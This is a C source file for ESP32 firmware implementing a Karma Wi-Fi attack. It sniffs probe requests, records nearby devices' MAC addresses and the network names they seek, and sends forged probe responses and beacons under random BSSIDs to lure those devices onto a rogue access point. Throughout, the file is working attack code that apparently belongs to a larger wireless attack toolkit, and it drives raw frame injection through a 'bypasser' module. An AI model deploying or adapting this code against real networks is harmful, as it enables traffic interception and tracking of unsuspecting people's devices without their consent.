#include "attack_karma.h"

#include <string.h>
#include <stdio.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "heap_psram.h"
#include "wifi_ie_parser.h"
#include "wifi_radio_claim.h"
#include "wsl_bypasser.h"
#include "wifi_controller.h"

static const char *TAG = "karma";

#define HOP_INTERVAL_MS  200
#define BEACON_INTERVAL_US 120000

static SemaphoreHandle_t s_mutex;
static bool s_running;
static bool s_respond_broadcast;
static bool s_send_beacons;
static uint16_t s_timeout_sec;
static karma_entry_t *s_entries;
static int s_count;
static uint32_t s_total_probes;
static uint32_t s_total_responses;
static TaskHandle_t s_hop_task;
static esp_timer_handle_t s_timeout_timer;
static esp_timer_handle_t s_beacon_timer;
static uint8_t s_own_mac[6];

static void ensure_mutex(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
}

static void generate_bssid(uint8_t *bssid)
{
    for (int i = 0; i < 6; i++) {
        bssid[i] = (uint8_t)(esp_random() & 0xFF);
    }
    bssid[0] = (uint8_t)((bssid[0] | 0x02) & 0xFE);
}

static int find_entry(const char *ssid, uint8_t len, const uint8_t client[6])
{
    for (int i = 0; i < s_count; i++) {
        if (s_entries[i].ssid_len == len &&
            memcmp(s_entries[i].ssid, ssid, len) == 0 &&
            memcmp(s_entries[i].client_mac, client, 6) == 0) {
            return i;
        }
    }
    return -1;
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "Karma timeout");
    attack_karma_stop();
}

static void beacon_cb(void *arg)
{
    (void)arg;
    if (!s_running || !s_send_beacons || s_entries == NULL) {
        return;
    }
    uint8_t ch = 1;
    wifi_second_chan_t sec;
    esp_wifi_get_channel(&ch, &sec);

    if (xSemaphoreTake(s_mutex, pdMS_TO_TICKS(10)) != pdTRUE) {
        return;
    }
    for (int i = 0; i < s_count; i++) {
        wsl_bypasser_send_beacon_frame(s_entries[i].bssid,
                                       (uint8_t *)s_entries[i].ssid,
                                       s_entries[i].ssid_len, ch);
    }
    xSemaphoreGive(s_mutex);
}

static void hop_task(void *arg)
{
    (void)arg;
    uint8_t channels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
    int idx = 0;
    while (s_running) {
        esp_wifi_set_channel(channels[idx], WIFI_SECOND_CHAN_NONE);
        idx = (idx + 1) % (int)sizeof(channels);
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }
    s_hop_task = NULL;
    vTaskDelete(NULL);
}

static void handle_probe(wifi_promiscuous_pkt_t *pkt)
{
    const uint8_t *frame = pkt->payload;
    size_t len = pkt->rx_ctrl.sig_len;
    if (!wifi_mgmt_is_probe_req(frame, len)) {
        return;
    }
    if (memcmp(frame + 10, s_own_mac, 6) == 0) {
        return;
    }

    const uint8_t *ies = NULL;
    size_t ies_len = 0;
    if (!wifi_mgmt_get_ies(frame, len, &ies, &ies_len)) {
        return;
    }

    char ssid[KARMA_SSID_MAX] = {0};
    uint8_t ssid_len = 0;
    bool has_ssid = wifi_ie_extract_ssid(ies, ies_len, ssid, sizeof(ssid), &ssid_len);
    if (!has_ssid) {
        if (!s_respond_broadcast) {
            return;
        }
        /* Broadcast probe — optional: ignore for response identity */
        return;
    }

    const uint8_t *client = frame + 10;
    uint8_t channel = pkt->rx_ctrl.channel;
    int8_t rssi = pkt->rx_ctrl.rssi;

    if (xSemaphoreTake(s_mutex, pdMS_TO_TICKS(5)) != pdTRUE) {
        return;
    }
    s_total_probes++;

    int idx = find_entry(ssid, ssid_len, client);
    if (idx < 0) {
        if (s_count >= KARMA_MAX_ENTRIES) {
            xSemaphoreGive(s_mutex);
            return;
        }
        idx = s_count++;
        memset(&s_entries[idx], 0, sizeof(s_entries[idx]));
        memcpy(s_entries[idx].ssid, ssid, ssid_len);
        s_entries[idx].ssid[ssid_len] = '\0';
        s_entries[idx].ssid_len = ssid_len;
        memcpy(s_entries[idx].client_mac, client, 6);
        generate_bssid(s_entries[idx].bssid);
        s_entries[idx].channel = channel;
        s_entries[idx].rssi = rssi;
        ESP_LOGI(TAG, "Karma target \"%s\" from %02X:%02X:%02X:%02X:%02X:%02X",
                 ssid, client[0], client[1], client[2], client[3], client[4], client[5]);
    } else if (rssi > s_entries[idx].rssi) {
        s_entries[idx].rssi = rssi;
    }
    s_entries[idx].probe_count++;

    /* Respond with probe response on current channel */
    bool ok = wsl_bypasser_send_probe_response(client, s_entries[idx].bssid,
                                               (uint8_t *)s_entries[idx].ssid,
                                               s_entries[idx].ssid_len, channel);
    if (ok) {
        s_entries[idx].response_count++;
        s_total_responses++;
    }
    xSemaphoreGive(s_mutex);
}

static void sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || type != WIFI_PKT_MGMT) {
        return;
    }
    handle_probe((wifi_promiscuous_pkt_t *)buf);
}

void attack_karma_init(void)
{
    ensure_mutex();
    if (s_entries == NULL) {
        s_entries = heap_psram_calloc(KARMA_MAX_ENTRIES, sizeof(karma_entry_t));
    }
    s_count = 0;
    s_total_probes = 0;
    s_total_responses = 0;
    ESP_LOGI(TAG, "Karma module initialized");
}

esp_err_t attack_karma_start(bool respond_broadcast, bool send_beacons, uint16_t timeout_sec)
{
    ensure_mutex();
    if (s_running) {
        return ESP_ERR_INVALID_STATE;
    }
    if (s_entries == NULL) {
        attack_karma_init();
        if (s_entries == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    esp_err_t err = wifi_radio_claim(WIFI_RADIO_OWNER_KARMA);
    if (err != ESP_OK) {
        return err;
    }

    s_respond_broadcast = respond_broadcast;
    s_send_beacons = send_beacons;
    s_timeout_sec = timeout_sec ? timeout_sec : KARMA_TIMEOUT_SEC;
    if (s_timeout_sec > 600) {
        s_timeout_sec = 600;
    }

    s_count = 0;
    s_total_probes = 0;
    s_total_responses = 0;
    memset(s_entries, 0, sizeof(karma_entry_t) * KARMA_MAX_ENTRIES);
    wifictl_get_ap_mac(s_own_mac);

    esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    s_running = true;

    if (s_hop_task == NULL) {
        xTaskCreatePinnedToCore(hop_task, "karma_hop", 3072, NULL, 3, &s_hop_task, 1);
    }

    if (s_send_beacons) {
        const esp_timer_create_args_t args = {
            .callback = &beacon_cb,
            .name = "karma_beacon"
        };
        if (s_beacon_timer == NULL) {
            esp_timer_create(&args, &s_beacon_timer);
        }
        esp_timer_start_periodic(s_beacon_timer, BEACON_INTERVAL_US);
    }

    const esp_timer_create_args_t targs = {
        .callback = &timeout_cb,
        .name = "karma_timeout"
    };
    if (s_timeout_timer == NULL) {
        esp_timer_create(&targs, &s_timeout_timer);
    }
    esp_timer_start_once(s_timeout_timer, (uint64_t)s_timeout_sec * 1000000ULL);

    ESP_LOGI(TAG, "Karma started (beacons=%d timeout=%u)", send_beacons, s_timeout_sec);
    return ESP_OK;
}

void attack_karma_stop(void)
{
    if (!s_running) {
        return;
    }
    s_running = false;

    if (s_timeout_timer) {
        if (esp_timer_is_active(s_timeout_timer)) {
            esp_timer_stop(s_timeout_timer);
        }
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
    if (s_beacon_timer) {
        if (esp_timer_is_active(s_beacon_timer)) {
            esp_timer_stop(s_beacon_timer);
        }
        esp_timer_delete(s_beacon_timer);
        s_beacon_timer = NULL;
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);

    vTaskDelay(pdMS_TO_TICKS(300));
    if (s_hop_task) {
        vTaskDelete(s_hop_task);
        s_hop_task = NULL;
    }

    wifi_radio_release(WIFI_RADIO_OWNER_KARMA);
    ESP_LOGI(TAG, "Karma stopped (%d entries, %u responses)", s_count, (unsigned)s_total_responses);
}

bool attack_karma_is_running(void)
{
    return s_running;
}

void attack_karma_clear(void)
{
    ensure_mutex();
    if (xSemaphoreTake(s_mutex, portMAX_DELAY) == pdTRUE) {
        s_count = 0;
        s_total_probes = 0;
        s_total_responses = 0;
        if (s_entries) {
            memset(s_entries, 0, sizeof(karma_entry_t) * KARMA_MAX_ENTRIES);
        }
        xSemaphoreGive(s_mutex);
    }
}

cJSON *attack_karma_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) {
        return NULL;
    }
    ensure_mutex();
    xSemaphoreTake(s_mutex, portMAX_DELAY);
    cJSON_AddBoolToObject(root, "running", s_running);
    cJSON_AddNumberToObject(root, "entry_count", s_count);
    cJSON_AddNumberToObject(root, "total_probes", s_total_probes);
    cJSON_AddNumberToObject(root, "total_responses", s_total_responses);
    cJSON_AddBoolToObject(root, "send_beacons", s_send_beacons);
    cJSON_AddNumberToObject(root, "timeout_sec", s_timeout_sec);
    cJSON_AddStringToObject(root, "status", s_running ? "Running" : "Stopped");
    xSemaphoreGive(s_mutex);
    return root;
}

cJSON *attack_karma_get_results_json(void)
{
    cJSON *root = cJSON_CreateObject();
    cJSON *arr = cJSON_CreateArray();
    if (!root || !arr) {
        cJSON_Delete(root);
        cJSON_Delete(arr);
        return NULL;
    }
    ensure_mutex();
    xSemaphoreTake(s_mutex, portMAX_DELAY);
    for (int i = 0; i < s_count; i++) {
        cJSON *item = cJSON_CreateObject();
        char mac[18], bssid[18];
        wifi_mac_to_str(s_entries[i].client_mac, mac);
        wifi_mac_to_str(s_entries[i].bssid, bssid);
        cJSON_AddStringToObject(item, "ssid", s_entries[i].ssid);
        cJSON_AddStringToObject(item, "client", mac);
        cJSON_AddStringToObject(item, "bssid", bssid);
        cJSON_AddNumberToObject(item, "channel", s_entries[i].channel);
        cJSON_AddNumberToObject(item, "rssi", s_entries[i].rssi);
        cJSON_AddNumberToObject(item, "probes", s_entries[i].probe_count);
        cJSON_AddNumberToObject(item, "responses", s_entries[i].response_count);
        cJSON_AddItemToArray(arr, item);
    }
    cJSON_AddItemToObject(root, "entries", arr);
    cJSON_AddNumberToObject(root, "count", s_count);
    xSemaphoreGive(s_mutex);
    return root;
}
